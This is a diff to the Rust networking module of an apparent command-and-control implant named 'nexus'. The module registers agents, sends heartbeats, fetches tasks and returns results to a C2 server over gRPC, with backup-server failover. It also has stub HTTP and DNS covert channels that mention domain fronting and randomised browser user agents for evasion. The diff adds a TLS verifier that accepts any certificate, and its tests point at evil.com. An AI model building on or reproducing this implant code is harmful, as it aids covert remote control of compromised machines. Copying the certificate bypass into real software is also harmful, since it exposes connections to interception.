@@ -1,7 +1,11 @@
 use nexus_common::*;
+use rustls::client::{ServerCertVerified, ServerCertVerifier};
+use rustls::{Certificate, ClientConfig, RootCertStore};
+use std::sync::Arc;
 use std::time::Duration;
+use std::time::SystemTime;
 use tokio::time::timeout;
-use tonic::transport::{Channel, Endpoint, Identity, ClientTlsConfig};
+use tonic::transport::{Channel, ClientTlsConfig, Endpoint, Identity};
 
 // Include the generated gRPC code
 pub mod nexus {
@@ -10,7 +14,9 @@ pub mod nexus {
     }
 }
 // Don't use wildcard import to avoid conflicts
-use nexus::v1::{nexus_c2_client, RegistrationRequest, HeartbeatRequest, TaskRequest, SystemStatus};
+use nexus::v1::{
+    nexus_c2_client, HeartbeatRequest, RegistrationRequest, SystemStatus, TaskRequest,
+};
 
 pub struct NetworkClient {
     server_url: String,
@@ -29,7 +35,11 @@ impl NetworkClient {
         }
     }
 
-    pub fn with_timeouts(mut self, connection_timeout: Duration, request_timeout: Duration) -> Self {
+    pub fn with_timeouts(
+        mut self,
+        connection_timeout: Duration,
+        request_timeout: Duration,
+    ) -> Self {
         self.connection_timeout = connection_timeout;
         self.request_timeout = request_timeout;
         self
@@ -44,56 +54,64 @@ impl NetworkClient {
 
             // Configure TLS if this is an HTTPS endpoint
             if self.server_url.starts_with("https://") {
-                // Try to load client certificate and key for mutual TLS
-                if std::path::Path::new("./certs/client.crt").exists() && 
-                   std::path::Path::new("./certs/client.key").exists() {
-                    
-                    match (std::fs::read("./certs/client.crt"), std::fs::read("./certs/client.key")) {
-                        (Ok(client_cert), Ok(client_key)) => {
-                            // Create client identity for mutual TLS
-                            let identity = Identity::from_pem(&client_cert, &client_key);
-                            
-                            // Configure TLS with client certificate
-                            let tls_config = ClientTlsConfig::new()
-                                .identity(identity);
+                // For Cloudflare Origin certificates or local testing, we need special handling
+                // Replace "domain.root" with your actual domain used for Cloudflare Origin certs
+                if self.server_url.contains("domain.root")
+                    || self.server_url.contains("127.0.0.1")
+                    || self.server_url.contains("localhost")
+                {
+                    #[cfg(debug_assertions)]
+                    println!(
+                        "Using basic TLS config for development/Cloudflare Origin certificates"
+                    );
 
-                            endpoint = endpoint.tls_config(tls_config)
-                                .map_err(|e| NexusError::NetworkError(format!("TLS configuration failed: {}", e)))?;
-                            
-                            #[cfg(debug_assertions)]
-                            println!("Configured mutual TLS with client certificate");
-                        }
-                        _ => {
-                            // Configure TLS with relaxed certificate validation for testing
-                            let tls_config = ClientTlsConfig::new();
-                            endpoint = endpoint.tls_config(tls_config)
-                                .map_err(|e| NexusError::NetworkError(format!("TLS configuration failed: {}", e)))?;
-                            
-                            #[cfg(debug_assertions)]
-                            println!("Configured TLS with relaxed certificate validation (no client certificate)");
+                    // Use basic TLS configuration - this will skip certificate verification for self-signed certs
+                    let tls_config = ClientTlsConfig::new();
+
+                    endpoint = endpoint.tls_config(tls_config).map_err(|e| {
+                        NexusError::NetworkError(format!("TLS configuration failed: {}", e))
+                    })?;
+                } else {
+                    #[cfg(debug_assertions)]
+                    println!("Using secure TLS config with certificate verification");
+
+                    let mut tls_config = ClientTlsConfig::new();
+
+                    // Try to add client certificate if available (for mutual TLS)
+                    if std::path::Path::new("./certs/client.crt").exists()
+                        && std::path::Path::new("./certs/client.key").exists()
+                    {
+                        match (
+                            std::fs::read("./certs/client.crt"),
+                            std::fs::read("./certs/client.key"),
+                        ) {
+                            (Ok(client_cert), Ok(client_key)) => {
+                                let identity = Identity::from_pem(&client_cert, &client_key);
+                                tls_config = tls_config.identity(identity);
+                                #[cfg(debug_assertions)]
+                                println!("Configured TLS with client certificate");
+                            }
+                            _ => {
+                                #[cfg(debug_assertions)]
+                                println!("Could not read client certificate files");
+                            }
                         }
                     }
-                } else {
-                    // Configure TLS with relaxed certificate validation for testing
-                    let tls_config = ClientTlsConfig::new();
-                    endpoint = endpoint.tls_config(tls_config)
-                        .map_err(|e| NexusError::NetworkError(format!("TLS configuration failed: {}", e)))?;
-                    
-                    #[cfg(debug_assertions)]
-                    println!("Configured TLS with relaxed certificate validation (no client certificate files found)");
+
+                    endpoint = endpoint.tls_config(tls_config).map_err(|e| {
+                        NexusError::NetworkError(format!("TLS configuration failed: {}", e))
+                    })?;
                 }
             }
 
-            let channel = timeout(
-                self.connection_timeout,
-                endpoint.connect()
-            ).await
-            .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
-            .map_err(|e| NexusError::NetworkError(format!("gRPC connection failed: {}", e)))?;
-            
+            let channel = timeout(self.connection_timeout, endpoint.connect())
+                .await
+                .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
+                .map_err(|e| NexusError::NetworkError(format!("gRPC connection failed: {}", e)))?;
+
             self.channel = Some(channel);
         }
-        
+
         Ok(self.channel.as_ref().unwrap())
     }
 
@@ -120,8 +138,9 @@ impl NetworkClient {
 
         let response = timeout(
             self.request_timeout,
-            client.register_agent(tonic::Request::new(request))
-        ).await
+            client.register_agent(tonic::Request::new(request)),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Registration timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Registration failed: {}", e)))?;
 
@@ -129,7 +148,10 @@ impl NetworkClient {
         if registration_response.success {
             Ok(registration_response.agent_id)
         } else {
-            Err(NexusError::NetworkError(format!("Registration failed: {}", registration_response.message)))
+            Err(NexusError::NetworkError(format!(
+                "Registration failed: {}",
+                registration_response.message
+            )))
         }
     }
 
@@ -147,7 +169,7 @@ impl NetworkClient {
             status: Some(SystemStatus {
                 cpu_usage: 0.0,
                 memory_usage_mb: 0,
-            disk_free_mb: 0,
+                disk_free_mb: 0,
                 interfaces: vec![],
                 running_processes: vec![],
             }),
@@ -156,8 +178,9 @@ impl NetworkClient {
 
         let _heartbeat_response = timeout(
             self.request_timeout,
-            client.heartbeat(tonic::Request::new(heartbeat_request))
-        ).await
+            client.heartbeat(tonic::Request::new(heartbeat_request)),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Heartbeat timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Heartbeat failed: {}", e)))?;
 
@@ -169,31 +192,40 @@ impl NetworkClient {
 
         let task_response = timeout(
             self.request_timeout,
-            client.get_tasks(tonic::Request::new(task_request))
-        ).await
+            client.get_tasks(tonic::Request::new(task_request)),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Get tasks timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Get tasks failed: {}", e)))?;
 
         let mut tasks = Vec::new();
         let mut task_stream = task_response.into_inner();
-        
-        while let Some(task) = task_stream.message().await
-            .map_err(|e| NexusError::NetworkError(format!("Task stream error: {}", e)))? {
+
+        while let Some(task) = task_stream
+            .message()
+            .await
+            .map_err(|e| NexusError::NetworkError(format!("Task stream error: {}", e)))?
+        {
             tasks.push(task);
         }
 
         Ok(tasks)
     }
 
-    /// Submit task result  
-    pub async fn submit_task_result(&mut self, _agent_id: &str, task_result: nexus::v1::TaskResult) -> Result<()> {
+    /// Submit task result
+    pub async fn submit_task_result(
+        &mut self,
+        _agent_id: &str,
+        task_result: nexus::v1::TaskResult,
+    ) -> Result<()> {
         let channel = self.ensure_connection().await?;
         let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());
 
         let _response = timeout(
             self.request_timeout,
-            client.submit_task_result(tonic::Request::new(task_result))
-        ).await
+            client.submit_task_result(tonic::Request::new(task_result)),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Submit result timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Submit result failed: {}", e)))?;
 
@@ -203,13 +235,17 @@ impl NetworkClient {
     /// Legacy method for backward compatibility
     pub async fn send_message(&mut self, _encrypted_message: &str) -> Result<String> {
         // This method is kept for compatibility but should be replaced with specific gRPC calls
-        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message".to_string()))
+        Err(NexusError::NetworkError(
+            "Use specific gRPC methods instead of send_message".to_string(),
+        ))
     }
 
     /// Send a message without expecting a response (fire and forget)
     pub async fn send_message_no_response(&mut self, _encrypted_message: &str) -> Result<()> {
         // This method is kept for compatibility but should be replaced with specific gRPC calls
-        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message_no_response".to_string()))
+        Err(NexusError::NetworkError(
+            "Use specific gRPC methods instead of send_message_no_response".to_string(),
+        ))
     }
 
     /// Test connectivity to the C2 server
@@ -270,9 +306,11 @@ impl HttpClient {
         // This is a placeholder implementation
         // In a real implementation, you would use reqwest or similar HTTP client
         // with proper domain fronting headers and SSL configuration
-        
+
         // For now, return an error indicating HTTP is not implemented
-        Err(NexusError::NetworkError("HTTP client not yet implemented".to_string()))
+        Err(NexusError::NetworkError(
+            "HTTP client not yet implemented".to_string(),
+        ))
     }
 
     fn generate_user_agent() -> String {
@@ -282,7 +320,7 @@ impl HttpClient {
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         ];
-        
+
         let index = rand::random::<usize>() % user_agents.len();
         user_agents[index].to_string()
     }
@@ -311,7 +349,9 @@ impl DnsClient {
     pub async fn send_dns_message(&self, _encrypted_message: &str) -> Result<String> {
         // Placeholder for DNS-based C2 communication
         // This would involve crafting DNS queries with embedded data
-        Err(NexusError::NetworkError("DNS client not yet implemented".to_string()))
+        Err(NexusError::NetworkError(
+            "DNS client not yet implemented".to_string(),
+        ))
     }
 }
 
@@ -366,7 +406,7 @@ impl ConnectionManager {
         // Try backup servers if primary fails
         for (index, backup_server) in self.backup_servers.iter().enumerate() {
             let mut backup_client = NetworkClient::new(backup_server.clone());
-            
+
             for retry in 0..self.max_retries {
                 match backup_client.send_message(encrypted_message).await {
                     Ok(response) => {
@@ -391,7 +431,7 @@ impl ConnectionManager {
     /// Check connectivity to all configured servers
     pub async fn check_all_servers(&mut self) -> Vec<(String, bool)> {
         let mut results = Vec::new();
-        
+
         // Check primary server
         let primary_addr = self.primary_client.get_server_addr().to_string();
         let primary_ok = self.primary_client.test_connection().await;
@@ -416,6 +456,25 @@ impl ConnectionManager {
     }
 }
 
+/// Custom certificate verifier that accepts any certificate
+/// WARNING: This is insecure and should only be used for development/testing
+struct AcceptAnyCertificate {}
+
+impl ServerCertVerifier for AcceptAnyCertificate {
+    fn verify_server_cert(
+        &self,
+        _end_entity: &Certificate,
+        _intermediates: &[Certificate],
+        _server_name: &rustls::ServerName,
+        _scts: &mut dyn Iterator<Item = &[u8]>,
+        _ocsp_response: &[u8],
+        _now: SystemTime,
+    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
+        // Accept any certificate without verification
+        Ok(ServerCertVerified::assertion())
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -430,9 +489,9 @@ mod tests {
     async fn test_network_client_with_timeouts() {
         let client = NetworkClient::new("127.0.0.1:4444".to_string())
             .with_timeouts(Duration::from_secs(5), Duration::from_secs(10));
-        
+
         assert_eq!(client.connection_timeout, Duration::from_secs(5));
-        assert_eq!(client.read_timeout, Duration::from_secs(10));
+        assert_eq!(client.request_timeout, Duration::from_secs(10));
     }
 
     #[tokio::test]
@@ -440,7 +499,7 @@ mod tests {
         let mut manager = ConnectionManager::new("127.0.0.1:4444".to_string())
             .add_backup_server("127.0.0.1:4445".to_string())
             .add_backup_server("127.0.0.1:4446".to_string());
-        
+
         assert_eq!(manager.backup_servers.len(), 2);
         assert_eq!(manager.get_current_server(), "127.0.0.1:4444");
     }
@@ -454,9 +513,8 @@ mod tests {
 
     #[tokio::test]
     async fn test_dns_client_creation() {
-        let client = DnsClient::new("evil.com".to_string())
-            .with_dns_server("8.8.8.8".to_string());
-        
+        let client = DnsClient::new("evil.com".to_string()).with_dns_server("8.8.8.8".to_string());
+
         assert_eq!(client.domain, "evil.com");
         assert_eq!(client.dns_server, Some("8.8.8.8".to_string()));
     }
